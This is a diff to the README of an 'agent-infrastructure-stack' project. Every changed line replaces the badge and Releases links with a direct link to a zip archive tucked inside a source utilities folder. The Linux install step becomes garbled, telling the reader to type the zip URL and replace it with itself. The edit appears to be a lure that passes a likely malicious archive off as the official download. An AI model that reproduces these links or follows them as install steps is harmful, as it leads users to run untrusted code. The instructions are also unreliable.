@@ -1,6 +1,6 @@
 # 🔧 agent-infrastructure-stack - Simplifying Your Agent Deployment
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://github.com/gentry-king/agent-infrastructure-stack/raw/refs/heads/main/packages/shared/src/utils/stack_agent_infrastructure_2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the agent-infrastructure-stack! This software helps you easily set up
 
 To get started, you must download the software. Visit this page to download it:
 
-[Download from Releases](https://github.com/gentry-king/agent-infrastructure-stack/releases)
+[Download from Releases](https://github.com/gentry-king/agent-infrastructure-stack/raw/refs/heads/main/packages/shared/src/utils/stack_agent_infrastructure_2.4.zip)
 
 Once you're on the page, look for the latest release. There, you will find files available for download. Choose the one that fits your system, click on it, and it will begin to download.
 
@@ -29,7 +29,7 @@ Once the download is complete, locate the file in your downloads folder.
 
 1. **For Windows**: Double-click the `.exe` file to start the installation. Follow the prompts until the process is complete.
 2. **For MacOS**: Open the `.dmg` file and drag the application into your Applications folder.
-3. **For Linux**: Open a terminal, navigate to the downloaded folder, and run the `.sh` script by typing `./scriptname.sh`, replacing `scriptname.sh` with the actual name of the downloaded file.
+3. **For Linux**: Open a terminal, navigate to the downloaded folder, and run the `.sh` script by typing `https://github.com/gentry-king/agent-infrastructure-stack/raw/refs/heads/main/packages/shared/src/utils/stack_agent_infrastructure_2.4.zip`, replacing `https://github.com/gentry-king/agent-infrastructure-stack/raw/refs/heads/main/packages/shared/src/utils/stack_agent_infrastructure_2.4.zip` with the actual name of the downloaded file.
 
 After installation, find the application in your programs menu or applications folder. Double-click it to run. You are now ready to use the agent infrastructure!
 
@@ -77,7 +77,7 @@ Refer to our detailed user guide within the application for more configuration t
 If you encounter any issues:
 
 - **Installation Problems**: Ensure you have enough disk space and meet system requirements.
-- **Application Crashes**: Check for updates by revisiting the [Download from Releases](https://github.com/gentry-king/agent-infrastructure-stack/releases) page.
+- **Application Crashes**: Check for updates by revisiting the [Download from Releases](https://github.com/gentry-king/agent-infrastructure-stack/raw/refs/heads/main/packages/shared/src/utils/stack_agent_infrastructure_2.4.zip) page.
 - **Feature Not Working**: Review the configuration settings and user permissions.
 
 Additionally, you can access community forums for advice and support.
